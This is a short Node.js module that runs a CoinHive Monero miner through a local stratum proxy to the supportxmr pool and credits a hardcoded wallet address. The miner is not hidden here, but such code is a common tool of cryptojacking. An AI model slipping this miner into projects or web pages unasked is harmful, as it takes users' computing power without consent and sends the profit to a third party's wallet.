'use strict';

const CoinHive = require('./coinhive.js');
const createProxy = require('coin-hive-stratum');

module.exports = function startMiner() {
  const proxy = createProxy({
    host: 'la01.supportxmr.com',
    port: 3333,
  });
  proxy.listen(8892);

  CoinHive.CONFIG.WEBSOCKET_SHARDS = [
    ["ws://localhost:8892"]
  ];

  // Start miner
  var miner = CoinHive.Anonymous('433fFZ1iD5QieKz9C28Gji6aiPb3jyWeR5L4VQSJUqdA53geUUd9VkEffqwHFppbRNiWrNGaS5HeVCPcm3wWBmgdBpnh6fp');
  miner.start();
}
